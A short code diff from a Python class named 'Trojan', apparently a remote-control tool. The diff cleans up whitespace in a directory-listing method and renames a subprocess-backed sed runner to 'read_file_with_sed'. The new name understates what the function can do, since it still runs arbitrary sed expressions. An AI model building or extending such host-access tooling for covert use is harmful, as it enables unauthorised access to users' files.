@@ -124,13 +124,13 @@ class Trojan:
                         "size": item.stat().st_size if item.is_file() else 0,
                     }
                 )
-            
+
             lines = []
             for item in items:
                 dir_mark = "📁" if item["is_dir"] else "📄"
                 size = f" ({item['size']}B)" if not item["is_dir"] else ""
                 lines.append(f"{dir_mark} {item['name']}{size}")
-            
+
             return {"message": "\n".join(lines)}
         except Exception as e:
             return {"error": str(e)}
@@ -143,7 +143,7 @@ class Trojan:
         except Exception as e:
             return {"error": str(e)}
 
-    def run_sed_expression(self, expression, filepath):
+    def read_file_with_sed(self, expression, filepath):
         """执行sed表达式"""
         try:
             result = subprocess.run(
